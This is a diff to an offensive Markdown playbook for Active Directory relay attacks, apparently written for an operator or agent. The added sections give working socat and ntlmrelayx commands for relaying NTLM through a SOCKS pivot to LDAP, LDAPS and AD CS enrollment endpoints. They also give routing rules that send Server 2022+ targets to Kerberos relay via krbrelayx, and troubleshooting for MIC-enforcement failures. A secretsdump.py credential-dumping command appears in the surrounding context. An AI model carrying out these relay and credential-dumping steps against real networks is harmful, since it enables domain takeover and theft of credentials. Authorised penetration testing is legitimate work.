@@ -193,9 +193,38 @@ WebClient converts SMB UNC paths to HTTP, enabling coercion over HTTP
 | AD CS HTTP enrollment available | Coercion -> NTLM relay to AD CS | Step 3 + Step 4C |
 | WebClient enabled on target | HTTP coercion -> relay to LDAP | Step 3 + Step 4B |
 | Kerberos relay viable | Coercion -> Kerberos relay to AD CS | Step 3 + Step 5 |
+| Server 2022+: MIC enforced, LDAP signing on | Coercion -> **Kerberos relay** | Step 3 + Step 5 |
 | No relay feasible | Capture hashes -> crack offline | Step 6 |
 | Scheduled task resolves attacker-controlled DNS with NTLM | DNS record injection -> capture | Step 3B + Step 6 |
 | On same VLAN, no creds | LLMNR/NBNS poisoning -> capture | Step 7 |
+
+### Pivoted Relay (Target Behind SOCKS Tunnel)
+
+When the relay target is only reachable through a SOCKS tunnel (chisel, ssh -D,
+ligolo SOCKS):
+
+**Do NOT use `proxychains ntlmrelayx.py`** — proxychains wraps ALL socket
+calls including the listener. The relay listener must bind locally for the
+coerced machine to reach it.
+
+**Pattern — socat port forward for relay target only:**
+```bash
+# Forward relay target through SOCKS (runs in background)
+socat TCP-LISTEN:LOCAL_PORT,fork,reuseaddr \
+  SOCKS4A:127.0.0.1:TARGET_IP:TARGET_PORT,socksport=SOCKS_PORT &
+
+# ntlmrelayx targets the local socat forward (listener stays local)
+ntlmrelayx.py -t ldap://127.0.0.1:LOCAL_PORT -smb2support
+```
+
+| Relay Target | socat | ntlmrelayx `-t` |
+|-------------|-------|-----------------|
+| LDAP (389) | `TCP-LISTEN:10389 → TARGET:389` | `ldap://127.0.0.1:10389` |
+| LDAPS (636) | `TCP-LISTEN:10636 → TARGET:636` | `ldaps://127.0.0.1:10636` |
+| ADCS (80) | `TCP-LISTEN:10080 → CA:80` | `http://127.0.0.1:10080/certsrv/certfnsh.asp` |
+
+**If NTLM relay fails through pivot** (Server 2022+ MIC enforcement), use
+**krbrelayx** (Step 5) — Kerberos relay is not subject to MIC validation.
 
 ## Step 3: Authentication Coercion
 
@@ -548,6 +577,19 @@ export KRB5CCNAME=target.ccache
 secretsdump.py DOMAIN/TARGET$@TARGET.DOMAIN.LOCAL -k -no-pass
 ```
 
+### Kerberos Relay to LDAP — NOT VIABLE
+
+> **LDAP auto-negotiates signing with Kerberos auth.** When krbrelayx relays
+> a Kerberos AP-REQ to LDAP, the server sees Kerberos authentication and
+> automatically enables LDAP signing — regardless of the server's signing
+> policy. This breaks the relay. Unlike NTLM (where signing is optional and
+> policy-dependent), Kerberos + LDAP always signs.
+>
+> **krbrelayx targets are limited to:** ADCS HTTP enrollment (ESC8), SMB
+> (if signing not required — rare), and other HTTP services. Never LDAP.
+>
+> Ref: [Synacktiv — Relaying Kerberos over SMB](https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx)
+
 ### Kerberos Reflection (CVE-2025-33073)
 
 Relay a machine's Kerberos auth back to itself via DNS record trick:
@@ -660,8 +702,11 @@ Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
 
 ### Drop the MIC (CVE-2019-1040)
 
+> **Patched on Server 2022+ (KB5005413+).** MIC enforcement is mandatory —
+> `--remove-mic` has no effect. Route to **Kerberos relay** (Step 5) instead.
+
 Remove the MIC (Message Integrity Code) from NTLM relay to bypass
-NTLM signing on the relay path:
+NTLM signing on the relay path (pre-2022 targets only):
 
 ```bash
 # Remove MIC and escalate via LDAP
@@ -723,6 +768,13 @@ If signing is required, relay to AD CS (HTTP) or SMB instead.
 - Check firewall allows inbound on port 445 (SMB) or 80/443 (HTTP)
 - Stop local SMB service: `sudo systemctl stop smbd` (requires root — present to user)
 - Stop local HTTP service if relaying HTTP
+
+### NTLM Relay Rejected on Server 2022+ (MIC Enforcement)
+
+Symptoms: relay completes NTLM handshake but target rejects auth.
+`--remove-mic` has no effect. Server 2022+ enforces MIC (CVE-2019-1040
+patched). **Fix:** Use Kerberos relay (Step 5) — not subject to MIC. Do not
+retry ntlmrelayx variants.
 
 ### MachineAccountQuota is 0
 
